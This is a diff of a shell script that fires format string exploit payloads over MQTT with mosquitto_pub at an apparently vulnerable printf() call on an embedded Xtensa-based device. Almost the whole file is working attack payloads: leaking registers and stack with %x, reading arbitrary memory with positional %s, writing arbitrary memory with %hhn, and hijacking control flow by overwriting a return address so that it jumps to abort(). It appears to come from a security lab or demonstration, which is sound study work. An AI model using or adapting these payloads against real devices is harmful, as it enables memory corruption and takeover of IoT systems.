@@ -1,15 +1,15 @@
-# The format string attack exists in the snprintf() function.
-# The call is: snprintf(buf, sizeof(buf), event->data)
+# The format string attack exists in the printf() function.
+# The call is: printf(buf)
 # buf is loaded into register A10.
-# sizeof(buf) is loaded into A11.
-# event->data is loaded into A12.
-# Registers A13 - A15 (and the stack) are used for incoming arguments.
+# Registers A11 - A15 (and the stack) are used for incoming arguments.
 
 command_prefix="mosquitto_pub -h localhost -p 1883 -t /topic/qos0 -m"
 
 tag_addr="e82f403f"
 
-write_addr="b07efc3f"
+write_addr="5098fc3f5198fc3f5298fc3f5398fc3f"
+
+ret_addr="507efc3f517efc3f527efc3f"
 
 nl_bin=$(echo "0a0d" | xxd -p -r)
 
@@ -17,16 +17,22 @@ tag_addr_bin=$(echo $tag_addr | xxd -p -r)
 
 write_addr_bin=$(echo $write_addr | xxd -p -r)
 
+ret_addr_bin=$(echo $ret_addr | xxd -p -r)
+
 # Reading the stack
 $command_prefix "READING THE STACK:"
 $command_prefix "$nl_bin \
-    Registers A13 - A15: %x %x %x $nl_bin \
+    Registers A11 - A15: %x %x %x %x %x $nl_bin \
     Stack frame: %x %x %x %x %x"
 
-# Reading arbitrary memory
+# # Reading arbitrary memory
 $command_prefix "READING ARIBTRARY MEMORY:"
-$command_prefix "$tag_addr_bin %x %x %x %s"
+$command_prefix "$tag_addr_bin %6\$s"
 
-# Writing arbitrary memory
-$command_prefix "WRITING ARIBTRARY MEMORY:"
-$command_prefix "$write_addr_bin%08x%08x%4473134x%n $nl_bin %4\$s"
+# # Writing arbitrary memory
+$command_prefix "WRITING ARBITRARY MEMORY:"
+$command_prefix "$write_addr_bin%49x%6\$hhn %7\$hhn %8\$hhn %9\$hhn $nl_bin %6\$s"
+
+# Control flow hijack to address 0x4008e37c = abort()
+$command_prefix "CONTROL FLOW HIJACK"
+$command_prefix "$ret_addr_bin%112x%6\$hhn%103x%7\$hhn%37x%8\$hhn"
